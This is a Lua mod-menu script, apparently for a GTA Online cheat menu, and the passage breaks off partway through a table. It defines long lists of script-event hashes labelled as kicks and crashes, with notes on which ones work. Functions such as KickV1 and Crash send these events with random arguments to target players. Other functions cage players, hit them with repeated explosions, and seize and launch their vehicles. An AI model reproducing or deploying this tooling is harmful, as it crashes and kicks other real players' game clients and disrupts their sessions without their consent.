--------------------------------------------------- CREDITS ----------------------------------------------------------
--[[
PNoName - as much as I dont like him I will still credit him because im not an asshole
Bunny
HoppaC4
Lance
Ayrapheyr
Jayphen
Nowiry
and all the 2t1 lua devs Pnn undoubtably skidded from

also shoutouts to Jayphen and JayMontana for being really cool people :)
]]
----------------------------------------------------------------------------------------------------------------------

require("natives-1614644776")

_natives_PLAYER = PLAYER
_natives_NETWORK = NETWORK
_natives_ENTITY = ENTITY
player = {

    ["get_player_ped"] = function(player)
        -- if player == players.user() then return _natives_PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(-1) end 
        return _natives_PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
    end,

    ["get_player_coords"] = function(player)
        return _natives_ENTITY.GET_ENTITY_COORDS(_natives_PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player), true)
    end

}

local data, data2, data3, data4, data6 = {}, {}, {}, {}, {}
local configfile, scidFile, Player_DB, Spamtxt_Data, kickdata, kickdata2, kickdata3, kickdata4, kickdata6
local scriptdir = filesystem.scripts_dir()
local k1t1, k1t2, k1t3, k2t1, k2t2, k2t3, k3t1, k3t2, k3t3, kickarray, kickslow, crasharray
local spinbot_vehicles = false
local rotation = 0

kickdata = (scriptdir .. "\\data\\Kicks\\Kicks.data")
kickdata2 = (scriptdir .. "\\data\\Kicks\\Kicks2.data")
kickdata3 = (scriptdir .. "\\data\\Kicks\\Kicks3.data")
kickdata4 = (scriptdir .. "\\data\\Kicks\\Kicks4.data")
kickdata6 = (scriptdir .. "\\data\\Kicks\\Kicks6.data")

function dataload()
    if not filesystem.exists(kickdata) then return end
    for line in io.lines(kickdata) do data[#data + 1] = line end
end
dataload()

function dataload2()
    if not filesystem.exists(kickdata2) then return end
    for line in io.lines(kickdata2) do data2[#data2 + 1] = line end
end
dataload2()

function dataload3()
    if not filesystem.exists(kickdata3) then return end
    for line in io.lines(kickdata3) do data3[#data3 + 1] = line end
end
dataload3()

function paramload()
    if not filesystem.exists(kickdata4) then return end
    for line in io.lines(kickdata4) do data4[#data4 + 1] = line end
end
paramload()

function dataload6()
    if not filesystem.exists(kickdata6) then return end
    for line in io.lines(kickdata6) do data6[#data6 + 1] = line end
end
dataload6()

local function args(pid)
	local t = math.random
	local r, u = -2147483647, 2147483647
	return { pid, t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u)}
end

function arg11(pid)
    return (1630317 + (1 + (pid * 595) + 506))
end

local function args2(pid)
	local t = math.random
	local r, u = -2147483647, 2147483647
	return { pid, t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u)}
end  

local function get_full_arg_table(pid)
	local t = math.random
	local r, u = -2147483647, 2147483647
	return {pid, t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), 
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u),
	t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u), t(r, u)}
end  

local args1 = function()
    return  {-1, 623656, 5, 73473741, -7, 856844, -51251, 856844}
end

function v3(x, y, z)
	if x == nil then x = 0 end
	if y == nil then y = 0 end
	if z == nil then z = 0 end
end

function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			util.yield()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

function do_fade_in(pid) 
    CAM.DO_SCREEN_FADE_OUT(500)
    util.yield(500)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " on")
    orbital_cannon_effects(true)
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function do_fade_out(pid)
    util.yield(2500)
    CAM.DO_SCREEN_FADE_OUT(1000)
    util.yield(1000)
    orbital_cannon_effects(false)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off;nightvision off")
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function orbital_cannon_effects(on)
    if on then
        menu.trigger_commands("becomeorbitalcannon on;nightvision on;fov 130")
    else 
        menu.trigger_commands("becomeorbitalcannon off;fov 0;nightvision off")
    end
end
function orbital(pid) 
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        util.yield(20)
    end
end

cages = {}
function cage_player(pos)
	local object_hash = util.joaat("prop_gold_cont_01b")
	pos.z = pos.z-0.9
	
	STREAMING.REQUEST_MODEL(object_hash)
	while not STREAMING.HAS_MODEL_LOADED(object_hash) do
		util.yield()
	end
	local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true) --why do you think I spawned the same object twice? lol
	cages[#cages + 1] = object1																			--just one of these objects is useless

	local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object2
	
	if object1 == 0 or object2 ==0 then --if 'CREATE_OBJECT' fails to create one of those 
		notification("Something Went Wrong Creating Cages", true, true)
	end
	ENTITY.FREEZE_ENTITY_POSITION(object1, true) --took me too much to realise it was what I needed 
	ENTITY.FREEZE_ENTITY_POSITION(object2, true)
	local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
	rot.x = -180
	rot.y = -180
	ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end


function for_table_do(table,with_access,func) -- <3 HoppaC4
	for i,ent in ipairs(table) do
		if with_access then
			if not RequestControlOfEnt(ent,3) then goto skip end
		end
		func(ent)
		::skip::
	end
end


function get_player_veh(pid,with_access)
	local ped = PLAYER.GET_PLAYER_PED(pid)	
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
		if not with_access then
			return vehicle
		end
		if RequestControlOfEnt(vehicle) then
			return vehicle
		end
	end
	return 0
end

function tp_veh_to(pid,x,y,z)
	local tries = 0
	local ped = PLAYER.GET_PLAYER_PED(pid)
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = get_player_veh(pid,false)	
		while tries <= 1000 do --bad coooooood >:( but idk anything better
			if RequestControlOfEnt(vehicle) then			
				ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicle, x, y, z, 0, 0, 1);
				tries = tries + 1
			end
		end
	end
end

function marqee(text)
	local temp = text
    text = text:sub(2)
	return text .. temp:sub(1, 1)
end

function upgrade_vehicle(player) --now my funky functions are useless :'( since u can do menu.trigger_commands("upgrade") or some shit
	local vehicle = get_player_veh(player,true)
	if vehicle then
		DECORATOR.DECOR_SET_INT(vehicle, "MPBitset", 0)
		VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
		for i = 0 ,50 do
			VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
		end	
		VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 0, 0, 0)
		VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle,0, 0, 0)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 22, true)
		VEHICLE._SET_VEHICLE_XENON_LIGHTS_COLOR(vehicle, 10)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, true)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, true)
		for i = 0 ,4 do
			if not VEHICLE._IS_VEHICLE_NEON_LIGHT_ENABLED(vehicle, i) then
				VEHICLE._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, i, true)
			end
		end
		VEHICLE._SET_VEHICLE_NEON_LIGHTS_COLOUR(vehicle, 255, 0, 255)
		VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "727")
	end
end

function launch_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 10000, true, false, true)
	end
end

function northp_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 10000, 0, true, false, true)
	end
end

function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end


local kicks_fast_legacy = {
	575344561,
    -1382676328,
    1256866538,
    -1753084819,
    1119864805,
    -1813981910,
    -892744477,
    -859672259,
    -898207315
}
local crashes = {
	--1926582096 nothing 
	-2043109205 -- actually crashes!

}
local kicks_crashes = {
    -988842806, --nothing
    315658550, -- this one is actually an invalid weather crash, but it just sets the weather locally for the other client -- nah lol its a kick
    -2043109205, -- most likey a forever condition hang -- actually crashes :P
    153488394, -- looks like a complicated and important event, defo needs good args to crash -- nothing
    -877212109, -- nothing
    -1881357102, -- nothing
    1033875141, -- I think it broke the fucking game when I sent it, lots of shit happened (and I think target was kicked not crashed)
    -1320260596, -- freemode events (?) maybe -- nothing
    --2092565704, -- network_bail - nothing
    1249026189, -- to do with heists -- "Kick Event SB", did not work on host
    515799090, -- same event entrypoints - kick, worked on host
    202252150, -- Kick Event S5
    -19131151, -- Kick
    -635501849, -- nothing
    -868839127, -- nothing
    -302187166, -- nothing
    297912845, -- freemode event -- nothing
    888578819, -- gc tick crash -- nothing
    -1002348481, -- gc tick crash -- nothing
    1694315389, -- gc tick crash -- nothing
    1337206479, -- gc tick crash -- nothing
    -1264708915, -- gc tick crash -- nothing
    -44054089, -- bsc tick crash -- nothing
    27493799, -- div_ent -- nothing
    247151081, -- PTD_TPLYS -- nothing
    1385748752, -- kytkr -- nothing
    1871141598, -- tick atvan -- nothing
    1069230108, -- seems to be related to idle kick ? -- nothing
    1163167720, -- invalid game warning -- nothing
    220852783, -- tc stol -- nothing
    -1857757712, --tc remo -- nothing
    -989654618 --tc bank -- nothing
}


local newcrashes = {
153488394,
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
-1727818500,
-655898431,
1889984715,
1166958622,
-1912844061,
897248694
}


local resolves = {
	"resolved",
	"ez",
	"didn't stand a chance"
}

function KickV1(pid, repeats) -- works
	for i = 1, repeats do
		for i,v in ipairs(kicks_fast_legacy) do
			arg = math.random(461950868, 999999999)
			send_script_event(v, pid, {pid, arg, arg})
			util.yield()
		end
	end
end

function Crash(pid) -- seems to send kick events as well as crashes?
	for i,v in ipairs(crashes) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end








local ozark_kick = { 
	-1212832151,
	1317868303,
	-1252906024,
	-1890951223,
	1428412924,
	699592812,
	1922258436,
	1101235920,
	121406262,
	-1256990787,
	2965958374,
	-1054826273,
	1620254541,
	1401831542,
	2099816323,
	-1491386500,
	-977515445,
	-435067392,
	1347850743,
	-1729804184,
	1881968783,
	-1559754940,
	767605081,
	-442306200,
	733106126,
	-966559987,
	1841943281,
	-2033338628,
	-1243454584,
	1352706024,
	-1990292823,
	-1246838892,
	830707189,
	1119498954,
	-891346918,
	-920663435,
	-1924332863,
	-1549630786,
	1998625272,
	1977655521,
	620255745,
	2017765964,
	1974064500,
	1070934291,
	-345371965,
	-2042143896,
	495824472,
	1159655011,
	-2017629233,
	-1648921703,
	-1333236192,
	-1949011582,
	-720040631,
	-2147483647
}

local kick_se_test = { 
    -1949011582,
    1244135940,
    931185764,
    880269514,
    -184087091,
    1120313136,
    -438498801,
    -2135614041,
    -2042143896,
    2017765964,
    1881968783,
    620255745,
    -1054826273,
    -190197401,
    37950012,
    1949047749,
    189426737,
    440451836,
    -1551731308,
    1027640676,
    -1858793976,
    1466961423,
    1919572202,
    1401831542,
    -1999145131,
    402719724,
    1525180252,
    -1756175141,
    1715510245,
    -801305185,
    1097312011,
    1717331426,
    1073357477,
    468940571,
    495824472,
    -2033338628,
    -962064463,
    931219308,
    -1730227041,
    501406112,
    -1042174840,
    314706334,
    1977655521,
    -2122716210,
    -1333236192,
    -620075057,
    -1542610935,
    1967155575,
    74423716,
    -961190199,
    -505351260,
    1217352219,
    877700249,
    639032041,
    -1243454584,
    -116602735,
    2058632186,
    891272013,
    393068387,
    1140870402,
    1101235920,
    -442306200,
    -345371965,
    -1379398115,
    575518757,
    889825697,
    764638896,
    1260307946,
    1430093873,
    550741583,
    858406863,
    1870047677,
    -1249091994,
    -49604647,
    -338445752,
    1302185744,
    -1975590661,
    1066968010,
    735307666,
    -763931968,
    1998625272,
    1723477505,
    206176460,
    -72590627,
    1045342179,
    -374910571,
    1000351374,
    2055893718,
    -599891884,
    -591321928,
    -720040631,
    1115000764,
    543040796,
    -1561698044,
    -1203311834,
    -1662268941,
    475909762,
    193916381,
    1983321563,
    1503747188,
    356132005,
    -1676842684,
    -529143813,
    1176365945,
    -10574121,
    306215142,
    -1740278601,
    -1676913872,
    -982430780,
    -660394610,
    1511186999,
    571133028,
    -1864549087,
    -922075519,
    -1437574346,
    -228458318,
    2131576964,
    177832320,
    1400694109,
    1166120552,
    145559396,
    -2080461139,
    1070934291,
    -1491386500,
    489321898,
    -1633299070,
    -638863591,
    405611573,
    -547753294,
    40168385,
    -1678014630,
    416104391,
    710791216,
    -253630609,
    -730739328,
    -1657159979,
    1570956502,
    -1705723814,
    -1595515659,
    261991583,
    -775470665,
    -1698341613,
    714506292,
    1376408207,
    2142017165,
    -1336925360,
    126014646,
    -1290202385,
    -402069102,
    2053227459,
    -1372360252,
    1006436615,
    547957431,
    809657238,
    -415666077,
    1188873208,
    -1549630786,
    1060402116,
    -504482199,
    89278042,
    1118933262,
    -1990292823,
    1352706024,
    348119077,
    1240791382,
    -948169674,
    2133081418,
    -262341369,
    1000457834,
    -375398087,
    -1329008922,
    1841943281,
    -852503405,
    925173178,
    -1989372325,
    1303708261,
    -1911813629,
    2098987581,
    -865197423,
    -1825953974,
    -921073084,
    156856405,
    -2060629306,
    262768112,
    421494533,
    1755988437,
    -1493184845,
    -1657017550,
    -577286683,
    465570678,
    -1632172694,
    1972484238,
    14345383,
    743968101,
    599029146,
    962465625,
    960916034,
    -1459006650,
    778805747,
    -1580390976,
    823645419,
    -2065346036,
    1213808185,
    67004146,
    582648726,
    -1031098030,
    -1295633605,
    614999494,
    -791577348,
    1294893057,
    -171207973,
    -568266702,
    1212829040,
    1345577858,
    767605081,
    -977515445,
    -365271546,
    -455354067,
    -1174459121,
    1096684293,
    -1497250740,
    -911939009,
    1347850743,
    -920663435,
    -1057419833,
    -1596113101,
    -1759105725,
    -1336932351,
    -1648921703,
    -1437387234,
    2062282408,
    1692477431,
    1553508941,
    699592812,
    1417613287,
    -2029779863,
    1596100569,
    392501634,
    -909357184,
    -1442614028,
    171064260,
    -152440739,
    -1353116588,
    835608275,
